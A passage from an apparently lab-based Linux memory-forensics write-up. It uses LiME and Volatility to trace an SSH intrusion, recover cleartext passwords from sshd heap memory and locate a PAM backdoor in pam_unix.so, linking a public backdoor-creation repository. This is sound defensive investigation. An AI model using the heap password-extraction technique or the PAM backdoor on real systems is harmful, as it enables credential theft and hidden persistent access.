</span></span><span class=line><span class=cl>real_odie $ <span class=nb>cd</span> LiME/src 
</span></span><span class=line><span class=cl>real_odie $ make
</span></span><span class=line><span class=cl>real_odie $ sudo insmod lime-4.9.0-8-amd64.ko <span class=s2>&#34;path=/home/odie/memory.dmp format=lime timeout=0&#34;</span>
</span></span><span class=line><span class=cl>real_odie $ strings memory.dmp <span class=p>|</span> grep <span class=s2>&#34;Linux version&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>Linux version 4.9.0-8-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 6.3.0 <span class=m>20170516</span> <span class=o>(</span>Debian 6.3.0-18+deb9u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 4.9.130-2 (2018-10-27)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=volatility-profile>Volatility profile</h3><p>I already presented a way to create a volatility profile in <code>Santhacklaus</code> CTF writeups: <a href=https://maki.bzh/courses/blog/writeups/santhacklaus2018/#profile-generation target=_blank rel="noopener noreffer">https://maki.bzh/courses/blog/writeups/santhacklaus2018/#profile-generation</a></p><p>Here, Odie will be doing the same thing:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>real_odie $ sudo apt install volatility-tools dwarfdump zip
</span></span><span class=line><span class=cl>real_odie $ <span class=nb>cd</span> /usr/src/volatility-tools/linux/
</span></span><span class=line><span class=cl>real_odie $ su root 
</span></span><span class=line><span class=cl>real_odie <span class=c1># make</span>
</span></span><span class=line><span class=cl>real_odie <span class=c1># uname -a</span>
</span></span><span class=line><span class=cl>Linux webserver 4.9.0-8-amd64 <span class=c1>#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux</span>
</span></span><span class=line><span class=cl>real_odie <span class=c1># zip Odie_profile.zip /usr/src/volatility-tools/linux/module.dwarf /boot/System.map-4.9.0-8-amd64</span>
</span></span><span class=line><span class=cl>  adding: usr/src/volatility-tools/linux/module.dwarf <span class=o>(</span>deflated 91%<span class=o>)</span>
</span></span><span class=line><span class=cl>  adding: boot/System.map-4.9.0-8-amd64 <span class=o>(</span>deflated 79%<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>All we have to do now is import the new profile wherever we want. In order to use it with Volatility. Personally I made a little docker for volatility: <a href=https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility target=_blank rel="noopener noreffer">https://gitlab.com/Maki_chaz/infosec-docker/tree/master/forensic/volatility</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sudo docker run --rm --name volatility -v /home/maki/Tools/plugin_vol:/opt/plug_vol -v <span class=si>${</span><span class=nv>PWD</span><span class=si>}</span>:/opt/usr_land -ti volatility
</span></span><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>plug_vol/ --info <span class=p>|</span> grep Odie
</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.6.1
</span></span><span class=line><span class=cl>LinuxOdie_profilex64            - A Profile <span class=k>for</span> Linux Odie_profile x64
</span></span><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f usr_land/memory.dmp linux_banner
</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.6.1
</span></span><span class=line><span class=cl>Linux version 4.9.0-8-amd64 <span class=o>(</span>debian-kernel@lists.debian.org<span class=o>)</span> <span class=o>(</span>gcc version 6.3.0 <span class=m>20170516</span> <span class=o>(</span>Debian 6.3.0-18+deb9u1<span class=o>)</span> <span class=o>)</span> <span class=c1>#1 SMP Debian 4.9.130-2 (2018-10-27)</span>
</span></span></code></pre></td></tr></table></div></div><p>Everything is finally ready for the analysis! You can download archives below:</p><table><thead><tr><th>Fichier</th><th>MD5</th><th>Lien</th></tr></thead><tbody><tr><td>memory.tar.gz</td><td>ff2d570749e019e00448fc83412ceeb1</td><td><a href=https://mega.nz/#!3LA3nQQQ!-2JIOVfsajxS-OPjERK4SEyWetSjyOiyWuPYkiXkqWU target=_blank rel="noopener noreffer">https://mega.nz/#!3LA3nQQQ!-2JIOVfsajxS-OPjERK4SEyWetSjyOiyWuPYkiXkqWU</a></td></tr><tr><td>Odie_profile.zip</td><td>61ab07058a0a66046ad085f0973b1543</td><td><a href=https://mega.nz/#!iXgTFazJ!x8w6eZaUcju1Le89nkUMLkSegQe3CD5sJeX8okuoBt8 target=_blank rel="noopener noreffer">https://mega.nz/#!iXgTFazJ!x8w6eZaUcju1Le89nkUMLkSegQe3CD5sJeX8okuoBt8</a></td></tr></tbody></table><h2 id=dfir-time>DFIR time</h2><p>Finally, the expect moment: the treasure hunt! Odie intends to investigate this mysterious connection. Fortunately, he has been cyberdefense courses at ENSIBS to help him in this task.</p><h3 id=malicious-connection>Malicious connection</h3><p>So, obviously a suspicious IP is connected:</p><blockquote><p>192.168.122.158</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_netstat &gt; pnetstat
</span></span><span class=line><span class=cl>$ cat pnetstat <span class=p>|</span> grep <span class=s1>&#39;192.168.122.158&#39;</span>
</span></span><span class=line><span class=cl>TCP      192.168.122.216 :   <span class=m>22</span> 192.168.122.158 :36736 ESTABLISHED                  sshd/22335
</span></span><span class=line><span class=cl>TCP      192.168.122.216 :   <span class=m>22</span> 192.168.122.158 :36736 ESTABLISHED                  sshd/22341
</span></span></code></pre></td></tr></table></div></div><p>These connections come from SSH. Let&rsquo;s see how processes are arranged:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_pstree &gt; ppstree
</span></span><span class=line><span class=cl>$ cat ppstree
</span></span><span class=line><span class=cl>Name                 Pid             Uid            
</span></span><span class=line><span class=cl>systemd              <span class=m>1</span>                              
</span></span><span class=line><span class=cl>.systemd-journal     <span class=m>193</span>                            
</span></span><span class=line><span class=cl>.systemd-udevd       <span class=m>216</span>                            
</span></span><span class=line><span class=cl>.systemd-timesyn     <span class=m>289</span>             <span class=m>100</span>            
</span></span><span class=line><span class=cl>.rsyslogd            <span class=m>324</span>                            
</span></span><span class=line><span class=cl>.dbus-daemon         <span class=m>326</span>             <span class=m>105</span>            
</span></span><span class=line><span class=cl>.cron                <span class=m>343</span>                            
</span></span><span class=line><span class=cl>.systemd-logind      <span class=m>344</span>                            
</span></span><span class=line><span class=cl>.agetty              <span class=m>371</span>                            
</span></span><span class=line><span class=cl>.sshd                <span class=m>374</span>                            
</span></span><span class=line><span class=cl>..sshd               <span class=m>409</span>                            
</span></span><span class=line><span class=cl>...sshd              <span class=m>418</span>             <span class=m>1000</span>           
</span></span><span class=line><span class=cl>....bash             <span class=m>419</span>             <span class=m>1000</span>           
</span></span><span class=line><span class=cl>.....sudo            <span class=m>22887</span>                          
</span></span><span class=line><span class=cl>......insmod         <span class=m>22888</span>                          
</span></span><span class=line><span class=cl>..sshd               <span class=m>22335</span>                          
</span></span><span class=line><span class=cl>...sshd              <span class=m>22341</span>           <span class=m>1000</span>           
</span></span><span class=line><span class=cl>....bash             <span class=m>22342</span>           <span class=m>1000</span>           
</span></span><span class=line><span class=cl>.....sudo            <span class=m>22347</span>                          
</span></span><span class=line><span class=cl>......su             <span class=m>22348</span>                          
</span></span><span class=line><span class=cl>.......bash          <span class=m>22349</span>                          
</span></span><span class=line><span class=cl>.dhclient            <span class=m>393</span>                            
</span></span><span class=line><span class=cl>.systemd             <span class=m>411</span>             <span class=m>1000</span>           
</span></span><span class=line><span class=cl>..<span class=o>(</span>sd-pam<span class=o>)</span>           <span class=m>412</span>             <span class=m>1000</span>           
</span></span><span class=line><span class=cl>.packagekitd         <span class=m>14659</span>                          
</span></span><span class=line><span class=cl>.polkitd             <span class=m>14670</span>                          
</span></span><span class=line><span class=cl>.containerd          <span class=m>16169</span>                          
</span></span><span class=line><span class=cl>.dockerd             <span class=m>16290</span>                          
</span></span><span class=line><span class=cl>.apache2             <span class=m>21462</span>                          
</span></span><span class=line><span class=cl>..apache2            <span class=m>21463</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21464</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21466</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21467</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21589</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21731</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21732</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21733</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21734</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>..apache2            <span class=m>21735</span>           <span class=m>33</span>             
</span></span><span class=line><span class=cl>.mysqld              <span class=m>21557</span>           <span class=m>107</span>            
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>Processes <code>22341</code> and <code>22335</code> are executes by the IUD 1000, in other words, the user <strong>odie</strong>. It&rsquo;s quite surprising.</p><p>The attacker has been logged in legitimately. If the hacker would abuse a binary, the parent would be this binary and not a legit service (like ssh). In our case, it&rsquo;s considered as a legit connection for the system, there are two possibilities:</p><ul><li>The attacker found the <strong>odie</strong>&rsquo;s password ;</li><li>The attacker implemented a backdoor.</li></ul><p>Odie knows his session password, it&rsquo;s easy to search it in memory using <code>yarascan</code> plugin from Volatility:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_yarascan -Y <span class=s2>&#34;1r0nm41d3n!&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>Task: sshd pid <span class=m>418</span> rule r1 addr 0x55f43e6dd646
</span></span><span class=line><span class=cl>0x55f43e6dd646  <span class=m>31</span> <span class=m>72</span> <span class=m>30</span> 6e 6d <span class=m>34</span> <span class=m>31</span> <span class=m>64</span> <span class=m>33</span> 6e <span class=m>21</span> 0d 6c <span class=m>73</span> <span class=m>20</span> 2d   1r0nm41d3n!.ls.-
</span></span><span class=line><span class=cl>0x55f43e6dd656  6c <span class=m>61</span> 0d <span class=m>73</span> <span class=m>75</span> <span class=m>64</span> 6f <span class=m>20</span> <span class=m>73</span> <span class=m>75</span> 0d 1b 5b <span class=m>41</span> 1b 5b   la.sudo.su..<span class=o>[</span>A.<span class=o>[</span>
</span></span><span class=line><span class=cl>0x55f43e6dd666  <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span>   A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A
</span></span><span class=line><span class=cl>0x55f43e6dd676  1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b   .<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.
</span></span><span class=line><span class=cl>0x55f43e6dd686  5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b   <span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>
</span></span><span class=line><span class=cl>0x55f43e6dd696  <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>42</span> 1b 5b <span class=m>42</span> 1b 5b <span class=m>41</span>   A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>B.<span class=o>[</span>B.<span class=o>[</span>A
</span></span><span class=line><span class=cl>0x55f43e6dd6a6  0d 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span>   ..<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A
</span></span><span class=line><span class=cl>0x55f43e6dd6b6  1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b   .<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.
</span></span><span class=line><span class=cl>0x55f43e6dd6c6  5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b   <span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>
</span></span><span class=line><span class=cl>0x55f43e6dd6d6  <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>41</span> 1b 5b <span class=m>42</span>   A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>A.<span class=o>[</span>B
</span></span><span class=line><span class=cl>0x55f43e6dd6e6  0d <span class=m>73</span> <span class=m>79</span> <span class=m>73</span> <span class=m>74</span> <span class=m>65</span> 6d <span class=m>63</span> <span class=m>74</span> <span class=m>20</span> 7f 6c <span class=m>20</span> <span class=m>72</span> <span class=m>65</span> <span class=m>73</span>   .systemct..l.res
</span></span><span class=line><span class=cl>0x55f43e6dd6f6  <span class=m>74</span> <span class=m>61</span> <span class=m>72</span> <span class=m>74</span> <span class=m>20</span> <span class=m>61</span> <span class=m>70</span> 7f <span class=m>61</span> 7f <span class=m>70</span> <span class=m>61</span> <span class=m>63</span> <span class=m>65</span> <span class=m>68</span> <span class=m>32</span>   tart.ap.a.paceh2
</span></span><span class=line><span class=cl>0x55f43e6dd706  7f 7f 7f <span class=m>68</span> <span class=m>65</span> <span class=m>32</span> 0d 1b 5b <span class=m>41</span> 1b 7f 6d <span class=m>61</span> <span class=m>72</span> <span class=m>69</span>   ...he2..<span class=o>[</span>A..mari
</span></span><span class=line><span class=cl>0x55f43e6dd716  <span class=m>61</span> <span class=m>64</span> <span class=m>62</span> 0d <span class=m>65</span> <span class=m>78</span> <span class=m>69</span> <span class=m>74</span> 0d <span class=m>70</span> <span class=m>69</span> 6e <span class=m>67</span> <span class=m>20</span> <span class=m>67</span> 6f   adb.exit.ping.go
</span></span><span class=line><span class=cl>0x55f43e6dd726  6f <span class=m>67</span> 6c <span class=m>65</span> 2e <span class=m>66</span> <span class=m>72</span> 0d <span class=m>03</span> 6c <span class=m>73</span> <span class=m>20</span> 2d 6c <span class=m>61</span> <span class=m>20</span>   ogle.fr..ls.-la.
</span></span><span class=line><span class=cl>0x55f43e6dd736  2f <span class=m>75</span> <span class=m>73</span> <span class=m>09</span> 6c 6f <span class=m>09</span> <span class=m>62</span> <span class=m>69</span> <span class=m>09</span> <span class=m>09</span> 0d <span class=m>73</span> <span class=m>73</span> <span class=m>68</span> 2d   /us.lo.bi...ssh-
</span></span></code></pre></td></tr></table></div></div><p>Interesting, this string appears many times in memory. In <code>sshd</code> process. Let&rsquo;s locate exactly where:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p <span class=m>418</span>
</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.6.1
</span></span><span class=line><span class=cl>Offset             Pid      Name                 Start              End                Flags               Pgoff Major  Minor  Inode      File Path
</span></span><span class=line><span class=cl>------------------ -------- -------------------- ------------------ ------------------ ------ ------------------ ------ ------ ---------- ---------
</span></span><span class=line><span class=cl>0xffff9796b895e040      <span class=m>418</span> sshd                 0x000055f43d7d3000 0x000055f43d890000 r-x                   0x0    <span class=m>254</span>      <span class=m>1</span>     <span class=m>143894</span> /usr/sbin/sshd
</span></span><span class=line><span class=cl>0xffff9796b895e040      <span class=m>418</span> sshd                 0x000055f43da90000 0x000055f43da93000 r--               0xbd000    <span class=m>254</span>      <span class=m>1</span>     <span class=m>143894</span> /usr/sbin/sshd
</span></span><span class=line><span class=cl>0xffff9796b895e040      <span class=m>418</span> sshd                 0x000055f43da93000 0x000055f43da94000 rw-               0xc0000    <span class=m>254</span>      <span class=m>1</span>     <span class=m>143894</span> /usr/sbin/sshd
</span></span><span class=line><span class=cl>0xffff9796b895e040      <span class=m>418</span> sshd                 0x000055f43da94000 0x000055f43da9d000 rw-                   0x0      <span class=m>0</span>      <span class=m>0</span>          <span class=m>0</span> 
</span></span><span class=line><span class=cl>0xffff9796b895e040      <span class=m>418</span> sshd                 0x000055f43e6b6000 0x000055f43e6fb000 rw-                   0x0      <span class=m>0</span>      <span class=m>0</span>          <span class=m>0</span> <span class=o>[</span>heap<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>The password has been found at the address <code>0x55f43e6dd646</code>. The sshd heap owns this address (<code>0x000055f43e6b6000</code> - <code>0x000055f43e6fb000</code>). Let&rsquo;s extract the heap:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x000055f43e6b6000 -p <span class=m>418</span> -D .
</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.6.1
</span></span><span class=line><span class=cl>Task       VM Start           VM End                         Length Path
</span></span><span class=line><span class=cl>---------- ------------------ ------------------ ------------------ ----
</span></span><span class=line><span class=cl>       <span class=m>418</span> 0x000055f43e6b6000 0x000055f43e6fb000            0x45000 ./task.418.0x55f43e6b6000.vma
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ strings task.418.0x55f43e6b6000.vma <span class=p>|</span> less 
</span></span><span class=line><span class=cl><span class=o>[</span>lot of useful data<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ strings task.418.0x55f43e6b6000.vma <span class=p>|</span> grep -C <span class=m>3</span> <span class=s2>&#34;sudo&#34;</span> 
</span></span><span class=line><span class=cl>0Em&gt;
</span></span><span class=line><span class=cl>sb_release -cs<span class=o>)</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>   stable<span class=s2>&#34;
</span></span></span><span class=line><span class=cl><span class=s2>sudo apt-get update &amp;&amp; sudo apt-get install docker-ce
</span></span></span><span class=line><span class=cl><span class=s2>sudo usermod -aG docker odie
</span></span></span><span class=line><span class=cl><span class=s2>i pa
</span></span></span><span class=line><span class=cl><span class=s2>ip a
</span></span></span><span class=line><span class=cl><span class=s2>apt install python
</span></span></span><span class=line><span class=cl><span class=s2>--
</span></span></span><span class=line><span class=cl><span class=s2>[2;2R
</span></span></span><span class=line><span class=cl><span class=s2>]11;rgb:0000/0000/2c2c
</span></span></span><span class=line><span class=cl><span class=s2>[&gt;65;5403;1ciT
</span></span></span><span class=line><span class=cl><span class=s2>sudo apt install mariadb-client mariadb-server
</span></span></span><span class=line><span class=cl><span class=s2>1r0nm41d3n!
</span></span></span><span class=line><span class=cl><span class=s2>sud su
</span></span></span><span class=line><span class=cl><span class=s2>o su
</span></span></span></code></pre></td></tr></table></div></div><p>I realize that there are many interesting things stored in the heap:</p><ul><li>Environment variables</li><li>Clear session password and hash</li><li>Executed commands</li></ul><p>Really instructive, let&rsquo;s do the same operation on the suspicious <code>sshd</code> process, the PID <code>22341</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_proc_maps -p <span class=m>22341</span> <span class=p>|</span> grep heap
</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.6.1
</span></span><span class=line><span class=cl>0xffff9796bab09040    <span class=m>22341</span> sshd                 0x0000556477825000 0x0000556477862000 rw-                   0x0      <span class=m>0</span>      <span class=m>0</span>          <span class=m>0</span> <span class=o>[</span>heap<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_dump_map -s 0x0000556477825000 -p <span class=m>22341</span> -D .
</span></span><span class=line><span class=cl>Volatility Foundation Volatility Framework 2.6.1
</span></span><span class=line><span class=cl>Task       VM Start           VM End                         Length Path
</span></span><span class=line><span class=cl>---------- ------------------ ------------------ ------------------ ----
</span></span><span class=line><span class=cl>     <span class=m>22341</span> 0x0000556477825000 0x0000556477862000            0x3d000 ./task.22341.0x556477825000.vma
</span></span></code></pre></td></tr></table></div></div><p>When the sshd heap is successfully extracted, I&rsquo;m looking for this string: <code>sudo</code>. Each time sudo is called, it asks for your password:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ strings task.22341.0x556477825000.vma <span class=p>|</span> grep -C <span class=m>3</span> <span class=s2>&#34;sudo&#34;</span>
</span></span><span class=line><span class=cl>odie
</span></span><span class=line><span class=cl><span class=o>(</span>	To+
</span></span><span class=line><span class=cl>sshd
</span></span><span class=line><span class=cl>sudo su
</span></span><span class=line><span class=cl>PlopPlop1337
</span></span><span class=line><span class=cl>odie
</span></span><span class=line><span class=cl>zV%0
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span></code></pre></td></tr></table></div></div><p>What a surprise, the string <code>PlopPlop1337</code> is really strange. This string does not appear in the heap of the legit sshd process. The backdoor hypothesis becomes a reality.</p><p>We have barely made this discovery that Odie wants to try to log on with these credentials:</p><blockquote><p>Odie : PlopPlop1337</p></blockquote><p>He realizes with amazement that it works! It seems that a backdoor has been installed! Questions are: where it is and how did it come here?</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_2.gif data-srcset="/lib/images/articles/realgsmoveinsilencelikelasagna/blue_2.gif, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_2.gif 1.5x, /lib/images/articles/realgsmoveinsilencelikelasagna/blue_2.gif 2x" data-sizes=auto alt=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_2.gif title=/lib/images/articles/realgsmoveinsilencelikelasagna/blue_2.gif></p><p>After a few research on the internet, I fell on PAM mechanism and a great GitHub for backdoor creation: <a href=https://github.com/zephrax/linux-pam-backdoor target=_blank rel="noopener noreffer">https://github.com/zephrax/linux-pam-backdoor</a></p><p>If we follow the GitHub carefully, the file containing the backdoor should be the <code>pam_unix.so</code> library.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_find_file -L &gt; pfile_list
</span></span><span class=line><span class=cl>$ cat pfile_list<span class=p>|</span> grep <span class=s1>&#39;pam_unix.so&#39;</span>
</span></span><span class=line><span class=cl>          <span class=m>406506</span> 0xffff97969858f128 /bin/bin/lib/x86_64-linux-gnu/security/pam_unix.so
</span></span><span class=line><span class=cl>          <span class=m>393641</span> 0xffff97967660c228 /bin/bin/lib/x86_64-linux-gnu/security/pam_unix.so.bak
</span></span></code></pre></td></tr></table></div></div><p>Well, well, well. Fortunately, our friend the hacker is a nice man, he has created a backup for us :D
Let&rsquo;s extract these files the <em>bak</em> should be the real library and the other the backdoor.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ vol.py --plugins<span class=o>=</span>../plug_vol/ --profile<span class=o>=</span>LinuxOdie_profilex64 -f memory.dmp linux_find_file -i 0xffff97969858f128 -O pam_unix.so
